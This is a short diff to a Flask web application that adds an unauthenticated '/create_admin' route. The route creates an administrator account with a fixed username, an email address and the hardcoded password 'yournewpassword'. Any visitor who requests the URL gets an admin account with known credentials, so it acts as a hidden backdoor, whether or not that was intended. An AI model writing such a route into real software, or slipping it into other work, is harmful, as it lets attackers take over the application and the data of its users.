@@ -208,3 +208,19 @@ if __name__ == '__main__':
         return redirect(url_for('admin_users'))
 
 app.config['RATELIMIT_STORAGE_URI'] = 'memory://'
+
+@app.route('/create_admin')
+def create_admin():
+    existing = User.query.filter_by(username='hotmariaclara').first()
+    if existing:
+        return "Admin already exists."
+    hashed = bcrypt.hashpw(b'yournewpassword', bcrypt.gensalt())
+    admin = User(
+        username='hotmariaclara',
+        email='kotsengmagara@netad.com',
+        password=hashed.decode('utf-8'),
+        is_admin=True
+    )
+    db.session.add(admin)
+    db.session.commit()
+    return "Admin created."
